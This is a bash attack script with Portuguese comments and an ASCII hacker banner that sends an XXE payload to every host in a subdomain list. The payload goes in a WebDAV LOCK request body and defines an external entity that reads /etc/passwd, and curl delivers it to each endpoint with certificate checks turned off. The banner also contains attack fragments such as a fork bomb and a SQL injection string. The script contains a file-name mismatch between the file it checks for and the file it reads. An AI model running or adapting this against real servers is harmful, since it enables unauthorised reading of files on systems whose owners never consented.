#!/bin/bash

# Função para exibir o banner inicial
display_banner() {
    echo -e "\033[0;35m"
cat << "EOF"
    
	 _____           _       _     _             
     |  __ \         | |     | |   (_)            
     | |__) |___  ___| |_   _| |___ _  ___  _ __  
     |  _  // _ \/ __| | | | | / __| |/ _ \| '_ \ 
     | | \ \  __/ (__| | |_| | \__ \ | (_) | | | |
     |_|  \_\___|\___|_|\__,_|_|___/_|\___/|_| |_|
	                    
                                              `:oDFo:`                            
                                           ./ymM0dayMmy/.                          
                                        -+dHJ5aGFyZGVyIQ==+-                    
                                    `:sm⏣~~Destroy.No.Data~~s:`                
                                 -+h2~~Maintain.No.Persistence~~h+-              
                             `:odNo2~~Above.All.Else.Do.No.Harm~~Ndo:`          
                          ./etc/shadow.0days-Data'%20OR%201=1--.No.0MN8'/.      
                       -++SecKCoin++e.AMd`       `.-://///+hbove.913.ElsMNh+-    
                      -~/.ssh/id_rsa.Des-                  `htN01UserWroteMe!-  
                      :dopeAW.No<nano>o                     :is:TЯiKC.sudo-.A:  
                      :we're.all.alike'`                     The.PFYroy.No.D7:  
                      :PLACEDRINKHERE!:                      yxp_cmdshell.Ab0:    
                      :msf>exploit -j.                       :Ns.BOB&ALICEes7:    
                      :---srwxrwx:-.`                        `MS146.52.No.Per:    
                      :<script>.Ac816/                        sENbove3101.404:    
                      :NT_AUTHORITY.Do                        `T:/shSYSTEM-.N:    
                      :09.14.2011.raid                       /STFU|wall.No.Pr:    
                      :hevnsntSurb025N.                      dNVRGOING2GIVUUP:    
                      :#OUTHOUSE-  -s:                       /corykennedyData:    
                      :$nmap -oS                              SSo.6178306Ence:    
                      :Awsm.da:                            /shMTl#beats3o.No.:    
                      :Ring0:                             `dDestRoyREXKC3ta/M:    
                      :23d:                               sSETEC.ASTRONOMYist:    
                       /-                        /yo-    .ence.N:(){ :|: & };:    
                                                 `:Shall.We.Play.A.Game?tron/    
                                                 ```-ooy.if1ghtf0r+ehUser5`    
                                               ..th3.H1V3.U2VjRFNN.jMh+.`                                     
                                              `MjM~~WE.ARE.se~~MMjMs                                          
                                               +~KANSAS.CITY's~-`                                             
                                                J~HAKCERS~./.`                                                
                                                .esc:wq!:`                                                    
                                                 +++ATH`    

EOF
    echo -e "\033[0mCreated by y4g4z4k"
}

# Exibe o banner
display_banner

# Define o payload XXE
xxe_payload='
<!DOCTYPE r [
<!ELEMENT r ANY >
<!ENTITY sp SYSTEM "file:///etc/passwd">
]>
<d:lockinfo xmlns:d="DAV:">
  <d:lockscope><d:exclusive/></d:lockscope>
  <d:locktype><d:write/></d:locktype>
  <d:owner>
  <d:href><r>&sp;</r></d:href>
  </d:owner>
</d:lockinfo>
'

# Verifica se o arquivo subs-alive.txt existe
if [[ ! -f subs-HERE.txt ]]; then
    echo "Arquivo .txt não encontrado!"
    exit 1
fi

# Lê os endpoints do arquivo subs-alive.txt
endpoints=()
while IFS= read -r line
do
    endpoints+=("$line")
done < subs-alive.txt

# Executa o ataque para cada endpoint
for endpoint in "${endpoints[@]}"
do
    echo "Fazendo o ataque para: $endpoint"
    curl -i -s -k -X LOCK "$endpoint" -H 'Timeout: Second-1' --data-binary "$xxe_payload"
    echo "-------------------------------------"
done
